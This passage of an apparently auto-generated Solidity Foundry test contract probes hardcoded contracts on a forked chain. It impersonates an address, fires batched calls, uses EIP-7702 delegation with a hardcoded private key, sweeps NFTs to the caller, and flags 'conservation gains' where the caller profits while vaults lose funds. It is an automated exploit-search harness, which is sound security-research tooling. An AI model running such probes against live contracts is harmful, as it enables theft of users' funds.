        v[5] = VAULT_5;
        v[6] = VAULT_6;
        v[7] = VAULT_7;
        v[8] = VAULT_8;
        v[9] = VAULT_9;
        v[10] = VAULT_10;
        v[11] = VAULT_11;
        v[12] = VAULT_12;
        v[13] = VAULT_13;
        v[14] = VAULT_14;
        v[15] = VAULT_15;
        v[16] = VAULT_16;
        v[17] = VAULT_17;
        v[18] = VAULT_18;
        v[19] = VAULT_19;
        v[20] = VAULT_20;
    }

    function _snapshotBalances(address who) internal view returns (uint256[17] memory b) {
        b[0] = who.balance;
        b[1] = _erc20Bal(TOK_0, who);
        b[2] = _erc20Bal(TOK_1, who);
        b[3] = _erc20Bal(TOK_2, who);
        b[4] = _erc20Bal(TOK_3, who);
        b[5] = _erc20Bal(TOK_4, who);
        b[6] = _erc20Bal(TOK_5, who);
        b[7] = _erc20Bal(TOK_6, who);
        b[8] = _erc20Bal(TOK_7, who);
        b[9] = _erc20Bal(TOK_8, who);
        b[10] = _erc20Bal(TOK_9, who);
        b[11] = _erc20Bal(TOK_10, who);
        b[12] = _erc20Bal(TOK_11, who);
        b[13] = _erc20Bal(TOK_12, who);
        b[14] = _erc20Bal(TOK_13, who);
        b[15] = _erc20Bal(TOK_14, who);
        b[16] = _erc20Bal(TOK_15, who);
    }

    function _snapshotSupplies() internal view returns (uint256[17] memory s) {
        s[0] = 0;
        s[1] = _erc20Supply(TOK_0);
        s[2] = _erc20Supply(TOK_1);
        s[3] = _erc20Supply(TOK_2);
        s[4] = _erc20Supply(TOK_3);
        s[5] = _erc20Supply(TOK_4);
        s[6] = _erc20Supply(TOK_5);
        s[7] = _erc20Supply(TOK_6);
        s[8] = _erc20Supply(TOK_7);
        s[9] = _erc20Supply(TOK_8);
        s[10] = _erc20Supply(TOK_9);
        s[11] = _erc20Supply(TOK_10);
        s[12] = _erc20Supply(TOK_11);
        s[13] = _erc20Supply(TOK_12);
        s[14] = _erc20Supply(TOK_13);
        s[15] = _erc20Supply(TOK_14);
        s[16] = _erc20Supply(TOK_15);
    }

    function _snapshotAllVaultBalances() internal view returns (uint256[17] memory totalB) {
        address[21] memory vaults = _vaultTable();
        for (uint256 vIdx = 0; vIdx < 21; vIdx++) {
            address vAddr = vaults[vIdx];
            totalB[0] = _satAdd(totalB[0], vAddr.balance);
            totalB[1] = _satAdd(totalB[1], _erc20Bal(TOK_0, vAddr));
            totalB[2] = _satAdd(totalB[2], _erc20Bal(TOK_1, vAddr));
            totalB[3] = _satAdd(totalB[3], _erc20Bal(TOK_2, vAddr));
            totalB[4] = _satAdd(totalB[4], _erc20Bal(TOK_3, vAddr));
            totalB[5] = _satAdd(totalB[5], _erc20Bal(TOK_4, vAddr));
            totalB[6] = _satAdd(totalB[6], _erc20Bal(TOK_5, vAddr));
            totalB[7] = _satAdd(totalB[7], _erc20Bal(TOK_6, vAddr));
            totalB[8] = _satAdd(totalB[8], _erc20Bal(TOK_7, vAddr));
            totalB[9] = _satAdd(totalB[9], _erc20Bal(TOK_8, vAddr));
            totalB[10] = _satAdd(totalB[10], _erc20Bal(TOK_9, vAddr));
            totalB[11] = _satAdd(totalB[11], _erc20Bal(TOK_10, vAddr));
            totalB[12] = _satAdd(totalB[12], _erc20Bal(TOK_11, vAddr));
            totalB[13] = _satAdd(totalB[13], _erc20Bal(TOK_12, vAddr));
            totalB[14] = _satAdd(totalB[14], _erc20Bal(TOK_13, vAddr));
            totalB[15] = _satAdd(totalB[15], _erc20Bal(TOK_14, vAddr));
            totalB[16] = _satAdd(totalB[16], _erc20Bal(TOK_15, vAddr));
        }
    }

    function _takeSnap(address who) internal view returns (ConservationSnap memory s) {
        s.callerBal = _snapshotBalances(who);
        s.vaultBal = _snapshotAllVaultBalances();
        s.supply = _snapshotSupplies();
        s.wnativeBacking = address(TOK_3).balance;
    }

    function _emitAssetGainIfSettled(
        uint256 sliceIdx,
        address asset,
        uint256 rawCallerGain,
        uint256 vLoss,
        uint256 sInc,
        uint256 gasUsed
    ) internal {
        uint256 conservedLoss = _satAdd(vLoss, sInc);
        if (conservedLoss == 0 || rawCallerGain == 0) {
            return;
        }
        uint256 settledGain = _verifyPostCommitSettlement(asset, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, rawCallerGain);
        if (settledGain > 0) {
            if (sInc > 0) {
                emit ConservationSupplyMint(sliceIdx, asset, sInc);
            }
            emit ConservationGain(sliceIdx, asset, settledGain, conservedLoss, gasUsed);
        }
    }


    function _netNatAndW(
        uint256 bNat,
        uint256 aNat,
        uint256 bW,
        uint256 aW,
        uint8 wDec
    ) internal pure returns (bool natWLoss, uint256 emitNatAmt, uint256 emitWAmt) {
        uint256 natG = aNat > bNat ? (aNat - bNat) : 0;
        uint256 natL = bNat > aNat ? (bNat - aNat) : 0;
        uint256 wG = aW > bW ? (aW - bW) : 0;
        uint256 wL = bW > aW ? (bW - aW) : 0;
        if (natL == 0 && wL == 0) {
            return (false, natG, wG);
        }
        if (natG > 0 && wL > 0) {
            if (wDec <= 18) {
                uint256 wLWei = _scaleToWei(wL, wDec);
                if (natG > wLWei) {
                    return (false, natG - wLWei, 0);
                }
                return (natG < wLWei, 0, 0);
            } else {
                uint256 subScale = (wDec - 18) <= 77 ? (10 ** uint256(wDec - 18)) : 0;
                uint256 wLCmp = subScale > 0 ? ((wL / subScale) + ((wL % subScale) > 0 ? 1 : 0)) : 0;
                if (subScale > 0 && natG > wLCmp) {
                    return (false, natG - wLCmp, 0);
                }
                return (subScale == 0 || natG * subScale < wL, 0, 0);
            }
        }
        if (wG > 0 && natL > 0) {
            if (wDec >= 18) {
                uint256 natLInW = _scaleFromWei(natL, wDec);
                if (wG > natLInW) {
                    return (false, 0, wG - natLInW);
                }
                return (wG < natLInW, 0, 0);
            } else {
                uint256 wGWei = _scaleToWei(wG, wDec);
                if (wGWei > natL) {
                    uint256 netWei = wGWei - natL;
                    uint256 netW = _scaleFromWei(netWei, wDec);
                    if (netW > 0) {
                        return (false, 0, netW);
                    }
                    return (false, netWei, 0);
                }
                return (wGWei < natL, 0, 0);
            }
        }
        return (true, 0, 0);
    }

    function _wReserveDropWei(
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 wIdx,
        uint8 wDec
    ) internal pure returns (uint256 unbackedReserveWei) {
        uint256 backingDropWei = b.wnativeBacking > a.wnativeBacking ? (b.wnativeBacking - a.wnativeBacking) : 0;
        uint256 wBurnWei = _scaleToWei(b.supply[wIdx] > a.supply[wIdx] ? (b.supply[wIdx] - a.supply[wIdx]) : 0, wDec);
        uint256 unbackedDropWei = backingDropWei > wBurnWei ? (backingDropWei - wBurnWei) : 0;
        uint256 bReqWei = _scaleToWei(b.supply[wIdx], wDec);
        uint256 aReqWei = _scaleToWei(a.supply[wIdx], wDec);
        uint256 defBeforeWei = bReqWei > b.wnativeBacking ? (bReqWei - b.wnativeBacking) : 0;
        uint256 defAfterWei = aReqWei > a.wnativeBacking ? (aReqWei - a.wnativeBacking) : 0;
        uint256 insolvDeltaWei = defAfterWei > defBeforeWei ? (defAfterWei - defBeforeWei) : 0;
        unbackedReserveWei = unbackedDropWei > insolvDeltaWei ? unbackedDropWei : insolvDeltaWei;
        if (a.supply[wIdx] > 0 && a.wnativeBacking < aReqWei && unbackedReserveWei == 0 && bReqWei == 0) {
            unbackedReserveWei = aReqWei - a.wnativeBacking;
        }
    }

    function _wSupplyAndBackingLoss(
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 wIdx,
        uint8 wDec
    ) internal pure returns (uint256 wSInc, uint256 wSWei) {
        wSInc = a.supply[wIdx] > b.supply[wIdx] ? (a.supply[wIdx] - b.supply[wIdx]) : 0;
        if (a.wnativeBacking > b.wnativeBacking) {
            uint256 wBacked = _scaleFromWei(a.wnativeBacking - b.wnativeBacking, wDec);
            wSInc = wSInc > wBacked ? (wSInc - wBacked) : 0;
        }
        wSWei = _scaleToWei(wSInc, wDec);
        uint256 unbackedReserveWei = _wReserveDropWei(b, a, wIdx, wDec);
        if (unbackedReserveWei > wSWei) {
            uint256 wAdj = _scaleFromWei(unbackedReserveWei - wSWei, wDec);
            wSInc = _satAdd(wSInc, (wAdj > 0 ? wAdj : 1));
            wSWei = unbackedReserveWei;
        }
    }

    function _wEqLoss(
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 wIdx,
        uint8 wDec,
        uint256 liqCredWei,
        uint256 liqDebW,
        uint256 wSWei
    ) internal pure returns (uint256 eqLoss, uint256 subWLoss) {
        uint256 vB = _satAdd(b.vaultBal[0], _scaleToWei(b.vaultBal[wIdx], wDec));
        uint256 vA = _satAdd(a.vaultBal[0], _scaleToWei(a.vaultBal[wIdx], wDec));
        uint256 wL = vB > vA ? (vB - vA) : 0;
        uint256 dW = _scaleToWei(liqDebW, wDec);
        if (dW > 0) {
            uint256 subV = dW <= wL ? dW : wL;
            wL -= subV;
            dW -= subV;
            uint256 subS = dW <= wSWei ? dW : wSWei;
            wSWei -= subS;
        }
        eqLoss = _satAdd(_satAdd(wL, wSWei), liqCredWei);
        if (eqLoss == 0 && wDec > 18 && b.vaultBal[0] >= a.vaultBal[0] && b.vaultBal[wIdx] > a.vaultBal[wIdx]) {
            subWLoss = b.vaultBal[wIdx] - a.vaultBal[wIdx];
        }
    }

    function _emitDualNatWGain(
        uint256[4] memory wArgs,
        address wAsset,
        uint8 wDec,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 eqLoss,
        uint256 subWLoss,
        uint256 wSettled
    ) internal {
        uint256 effWG;
        uint256 combNatGain;
        {
            uint256 rawNatG = a.callerBal[0] > b.callerBal[0] ? (a.callerBal[0] - b.callerBal[0]) : 0;
            uint256 effNatG = wArgs[2] < rawNatG ? wArgs[2] : rawNatG;
            uint256 rawWG = a.callerBal[wArgs[1]] > b.callerBal[wArgs[1]] ? (a.callerBal[wArgs[1]] - b.callerBal[wArgs[1]]) : 0;
            effWG = wSettled < rawWG ? wSettled : rawWG;
            combNatGain = _satAdd(effNatG, _scaleToWei(effWG, wDec));
        }
        if (combNatGain > 0 && eqLoss > 0) {
            emit ConservationGain(wArgs[0], address(0), combNatGain, eqLoss, wArgs[3]);
        } else if (subWLoss > 0) {
            uint256 rawSubLoss = b.vaultBal[wArgs[1]] > a.vaultBal[wArgs[1]] ? (b.vaultBal[wArgs[1]] - a.vaultBal[wArgs[1]]) : 0;
            if (effWG > 0 && rawSubLoss > 0) {
                emit ConservationGain(wArgs[0], wAsset, effWG, rawSubLoss, wArgs[3]);
            }
        }
    }

    function _emitSingleWGain(
        uint256[4] memory wArgs,
        address wAsset,
        uint8 wDec,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 eqLoss,
        uint256 subWLoss
    ) internal {
        uint256 wDelta = wArgs[2];
        if (eqLoss > 0 && _scaleFromWei(eqLoss, wDec) > 0) {
            emit ConservationGain(wArgs[0], wAsset, wDelta, _scaleFromWei(eqLoss, wDec), wArgs[3]);
        } else if (subWLoss > 0) {
            uint256 rawSingleSubLoss = b.vaultBal[wArgs[1]] > a.vaultBal[wArgs[1]] ? (b.vaultBal[wArgs[1]] - a.vaultBal[wArgs[1]]) : 0;
            if (wDelta > 0 && rawSingleSubLoss > 0) {
                emit ConservationGain(wArgs[0], wAsset, wDelta, rawSingleSubLoss, wArgs[3]);
            }
        } else if (eqLoss > 0) {
            wDelta = _scaleToWei(wArgs[2], wDec);
            if (wDelta > 0) {
                emit ConservationGain(wArgs[0], address(0), wDelta, eqLoss, wArgs[3]);
            }
        }
    }

    function _emitWNativeGain(
        uint256 sliceIdx,
        address[17] memory assets,
        uint256 wIdx,
        uint8 wDec,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256[4] memory wMeta,
        uint256 gasUsed
    ) internal {
        (uint256 wSInc, uint256 wSWei) = _wSupplyAndBackingLoss(b, a, wIdx, wDec);
        (uint256 eqLoss, uint256 subWLoss) = _wEqLoss(b, a, wIdx, wDec, wMeta[2], wMeta[3], wSWei);
        if (eqLoss == 0 && subWLoss == 0) {
            return;
        }
        if (wMeta[1] > 0) {
            uint256 chkWAmt = a.callerBal[wIdx] > b.callerBal[wIdx] ? (a.callerBal[wIdx] - b.callerBal[wIdx]) : wMeta[1];
            uint256 settledW = _verifyPostCommitSettlement(assets[wIdx], 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, chkWAmt);
            if (settledW == 0) {
                return;
            }
            if (settledW < wMeta[1]) {
                wMeta[1] = settledW;
            }
        }
        if (wSInc > 0) {
            emit ConservationSupplyMint(sliceIdx, assets[wIdx], wSInc);
        }
        if (wMeta[0] > 0) {
            uint256 chkNatAmt = a.callerBal[0] > b.callerBal[0] ? (a.callerBal[0] - b.callerBal[0]) : wMeta[0];
            uint256 settledNat = _verifyPostCommitSettlement(address(0), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, chkNatAmt);
            if (settledNat == 0) {
                return;
            }
            if (settledNat < wMeta[0]) {
                wMeta[0] = settledNat;
            }
        }
        if (wMeta[0] > 0 && wMeta[1] > 0) {
            uint256[4] memory wArgs = [sliceIdx, wIdx, wMeta[0], gasUsed];
            _emitDualNatWGain(wArgs, assets[wIdx], wDec, b, a, eqLoss, subWLoss, wMeta[1]);
        } else if (wMeta[0] > 0) {
            uint256 wDelta = wMeta[0];
            emit ConservationGain(sliceIdx, address(0), wDelta, eqLoss, gasUsed);
        } else if (wMeta[1] > 0) {
            uint256[4] memory wArgs = [sliceIdx, wIdx, wMeta[1], gasUsed];
            _emitSingleWGain(wArgs, assets[wIdx], wDec, b, a, eqLoss, subWLoss);
        }
    }

    function _handleWNativeGroup(
        uint256 sliceIdx,
        address[17] memory assets,
        uint256 wIdx,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256[17] memory liqCredit,
        uint256[17] memory liqDebited,
        uint256 gasUsed
    ) internal returns (bool) {
        uint8 wDec = _erc20Decimals(assets[wIdx]);
        (bool natWLoss, uint256 emitNatAmt, uint256 emitWAmt) = _netNatAndW(
            b.callerBal[0], a.callerBal[0], b.callerBal[wIdx], a.callerBal[wIdx], wDec
        );
        if (natWLoss) {
            return false;
        }
        if (emitNatAmt > 0 || emitWAmt > 0) {
            uint256[4] memory wMeta;
            wMeta[0] = emitNatAmt;
            wMeta[1] = emitWAmt;
            wMeta[2] = _satAdd(liqCredit[0], _scaleToWei(liqCredit[wIdx], wDec));
            wMeta[3] = liqDebited[wIdx];
            _emitWNativeGain(sliceIdx, assets, wIdx, wDec, b, a, wMeta, gasUsed);
        }
        return true;
    }

    function _emitAssetIndexIfSettled(
        uint256 sliceIdx,
        address asset,
        uint256 idx,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 credI,
        uint256 debI,
        uint256 gasUsed
    ) internal {
        if (a.callerBal[idx] <= b.callerBal[idx]) {
            return;
        }
        uint256 vLossI = b.vaultBal[idx] > a.vaultBal[idx] ? (b.vaultBal[idx] - a.vaultBal[idx]) : 0;
        uint256 sIncI = (idx > 0 && a.supply[idx] > b.supply[idx]) ? (a.supply[idx] - b.supply[idx]) : 0;
        uint256 dUsedI = debI;
        if (dUsedI > 0) {
            uint256 subV = dUsedI <= vLossI ? dUsedI : vLossI;
            vLossI -= subV;
            dUsedI -= subV;
            uint256 subS = dUsedI <= sIncI ? dUsedI : sIncI;
            sIncI -= subS;
        }
        _emitAssetGainIfSettled(
            sliceIdx,
            asset,
            a.callerBal[idx] - b.callerBal[idx],
            _satAdd(vLossI, credI),
            sIncI,
            gasUsed
        );
    }

    function _assertConservationLiq(
        uint256 sliceIdx,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256[17] memory liqCredit,
        uint256[17] memory liqDebited,
        uint256 gasUsed
    ) internal {
        if (address(0xAD71fF296c9A76501A00F96d25c83c59547B9a28).code.length > 0) {
            return;
        }
        address[17] memory assets = _assetTable();
        uint256 wIdx = 4;
        if (wIdx > 0) {
            for (uint256 i = 1; i < 17; i++) {
                if (i != wIdx && a.callerBal[i] < b.callerBal[i]) {
                    return;
                }
            }
            if (!_handleWNativeGroup(sliceIdx, assets, wIdx, b, a, liqCredit, liqDebited, gasUsed)) {
                return;
            }
            for (uint256 i = 1; i < 17; i++) {
                if (i != wIdx) {
                    _emitAssetIndexIfSettled(sliceIdx, assets[i], i, b, a, liqCredit[i], liqDebited[i], gasUsed);
                }
            }
            return;
        }
        for (uint256 i = 0; i < 17; i++) {
            if (a.callerBal[i] < b.callerBal[i]) {
                return;
            }
        }
        for (uint256 i = 0; i < 17; i++) {
            _emitAssetIndexIfSettled(sliceIdx, assets[i], i, b, a, liqCredit[i], liqDebited[i], gasUsed);
        }
    }

    function _assertConservation(
        uint256 sliceIdx,
        ConservationSnap memory b,
        ConservationSnap memory a,
        uint256 gasUsed
    ) internal {
        uint256[17] memory zCredit;
        uint256[17] memory zDebited;
        _assertConservationLiq(sliceIdx, b, a, zCredit, zDebited, gasUsed);
    }

    function _probe_slice_0(uint256 _w) internal {
        _w;
        MidframeHelper_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 _helper = new MidframeHelper_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74();
        {
            {
                _helper.prepareCallbackData(0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74, bytes4(hex"7d7c2a1c"), abi.encodeWithSelector(bytes4(hex"7d7c2a1c"), uint256(_w), uint256(_w), uint256(_w)));
            }
        address[] memory legTgts = new address[](2);
        bytes[] memory legCds = new bytes[](2);
        {
            legTgts[0] = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
            legCds[0] = abi.encodeWithSelector(bytes4(hex"7d7c2a1c"), uint256(_w), uint256(_w), uint256(_w));
        }
        {
            legTgts[1] = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
            legCds[1] = abi.encodeWithSelector(bytes4(hex"7d7c2a1c"), uint256(_w), uint256(_w), uint256(_w));
        }
            _helper.execBatch(legTgts, legCds);
        }
        { (address _mNc, uint256 _mNid, uint256 _mNamt, bool _mN1155) = _helper.sweepTo(0xAD71fF296c9A76501A00F96d25c83c59547B9a28); if (_mNc != address(0) && _mNamt > 0) { emit ConservationNftGain(0, _mNc, _mNid, _mNamt, _mN1155); } }
    }

    function _probe_slice_1(uint256 _w) internal {
        _w;
        DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 _d7702 = new DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74();
        address[] memory legTgts = new address[](2);
        bytes[] memory legCds = new bytes[](2);
        {
            legTgts[0] = 0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5;
            legCds[0] = abi.encodeWithSelector(bytes4(hex"70a08231"), uint256(_w), uint256(_w), uint256(_w));
        }
        {
            legTgts[1] = 0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5;
            legCds[1] = abi.encodeWithSelector(bytes4(hex"70a08231"), uint256(_w), uint256(_w), uint256(_w));
        }
        vm.signAndAttachDelegation(address(_d7702), uint256(0x235ba9200fee3573ea77c1d439f65681e68e2e499dad331c69c4ff6c8765e3ea));
        DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74(payable(0xAD71fF296c9A76501A00F96d25c83c59547B9a28)).exec7702(legTgts, legCds);
        vm.signAndAttachDelegation(address(0), uint256(0x235ba9200fee3573ea77c1d439f65681e68e2e499dad331c69c4ff6c8765e3ea));
        new CtorProbe_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74(legTgts, legCds, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
    }

    function _probe_slice_2(uint256 _w) internal {
        _w;
        DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 _d7702 = new DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74();
        address[] memory legTgts = new address[](2);
        bytes[] memory legCds = new bytes[](2);
        {
            legTgts[0] = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
            legCds[0] = abi.encodeWithSelector(bytes4(hex"70a08231"), uint256(_w), uint256(_w), uint256(_w));
        }
        {
            legTgts[1] = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
            legCds[1] = abi.encodeWithSelector(bytes4(hex"70a08231"), uint256(_w), uint256(_w), uint256(_w));
        }
        vm.signAndAttachDelegation(address(_d7702), uint256(0x235ba9200fee3573ea77c1d439f65681e68e2e499dad331c69c4ff6c8765e3ea));
        DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74(payable(0xAD71fF296c9A76501A00F96d25c83c59547B9a28)).exec7702(legTgts, legCds);
        vm.signAndAttachDelegation(address(0), uint256(0x235ba9200fee3573ea77c1d439f65681e68e2e499dad331c69c4ff6c8765e3ea));
        new CtorProbe_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74(legTgts, legCds, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
    }

    function _probe_slice_3(uint256 _w) internal {
        _w;
        DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 _d7702 = new DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74();
        address[] memory legTgts = new address[](2);
        bytes[] memory legCds = new bytes[](2);
        {
            legTgts[0] = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
            legCds[0] = abi.encodeWithSelector(bytes4(hex"7d7c2a1c"), uint256(_w), uint256(_w), uint256(_w));
        }
        {
            legTgts[1] = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
            legCds[1] = abi.encodeWithSelector(bytes4(hex"7d7c2a1c"), uint256(_w), uint256(_w), uint256(_w));
        }
        vm.signAndAttachDelegation(address(_d7702), uint256(0x235ba9200fee3573ea77c1d439f65681e68e2e499dad331c69c4ff6c8765e3ea));
        DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74(payable(0xAD71fF296c9A76501A00F96d25c83c59547B9a28)).exec7702(legTgts, legCds);
        vm.signAndAttachDelegation(address(0), uint256(0x235ba9200fee3573ea77c1d439f65681e68e2e499dad331c69c4ff6c8765e3ea));
        new CtorProbe_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74(legTgts, legCds, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
    }

    function _probe_slice_4(uint256 _w) internal {
        _w;
        {
            {
                (bool _ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), uint256(_w)));
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(hex"248a9ca3"); }
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), uint256(_w), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28)); }
            }
            {
                (bool _ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), uint256(_w)));
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(hex"248a9ca3"); }
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74.call(abi.encodeWithSelector(bytes4(hex"248a9ca3"), uint256(_w), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28)); }
            }
        }
    }

    function _probe_slice_5(uint256 _w) internal {
        _w;
        {
            for (uint256 _it = 0; _it < 16; _it++) {
            { (bool _ok, ) = 0x3d3094Aec3b63C744b9fe56397D36bE568faEBdF.call(abi.encodeWithSelector(bytes4(hex"4ef4c3e1"), 0xAd84341756Bf337f5a0164515b1f6F993D194E1f, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, uint256(_w))); _ok; }
            }
        }
    }

    function _probe_slice_6(uint256 _w) internal {
        _w;
        {
            for (uint256 _it = 0; _it < 16; _it++) {
            { (bool _ok, ) = 0x50f05B91c5d5718A65A1233683748E98a3428F4b.call(abi.encodeWithSelector(bytes4(hex"4ef4c3e1"), 0xAd84341756Bf337f5a0164515b1f6F993D194E1f, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, uint256(_w))); _ok; }
            }
        }
    }

    function _probe_slice_7(uint256 _w) internal {
        _w;
        {
            {
                (bool _ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(hex"05c552d8");
                if (!_ok) { (_ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(abi.encodeWithSelector(bytes4(hex"05c552d8"), uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(abi.encodeWithSelector(bytes4(hex"05c552d8"), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(abi.encodeWithSelector(bytes4(hex"05c552d8"), uint256(_w), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28)); }
            }
            {
                (bool _ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(hex"05c552d8");
                if (!_ok) { (_ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(abi.encodeWithSelector(bytes4(hex"05c552d8"), uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(abi.encodeWithSelector(bytes4(hex"05c552d8"), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, uint256(_w))); }
                if (!_ok) { (_ok, ) = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA.call(abi.encodeWithSelector(bytes4(hex"05c552d8"), uint256(_w), 0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28)); }
            }
        }
    }

    function test_slice_0_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_0(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(0, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_0_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_0(uint256(1424));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(0, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_0_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_0(uint256(1425));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(0, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_0_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_0(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(0, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_0_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
